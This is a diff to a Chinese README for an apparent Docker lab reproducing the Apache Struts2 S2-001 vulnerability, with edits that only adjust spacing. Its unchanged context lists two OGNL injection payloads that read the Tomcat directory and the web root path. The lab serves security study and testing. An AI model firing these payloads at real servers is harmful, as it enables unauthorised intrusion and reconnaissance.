@@ -8,7 +8,7 @@
 
 ## 环境
 
-执行以下命令启动s2-001测试环境
+执行以下命令启动 s2-001 测试环境
 
 ```
 docker compose build
@@ -17,13 +17,13 @@ docker compose up -d
 
 ## POC && EXP
 
-获取tomcat执行路径：
+获取 tomcat 执行路径：
 
 ```
 %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
 ```
 
-获取Web路径：
+获取 Web 路径：
 
 ```
 %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
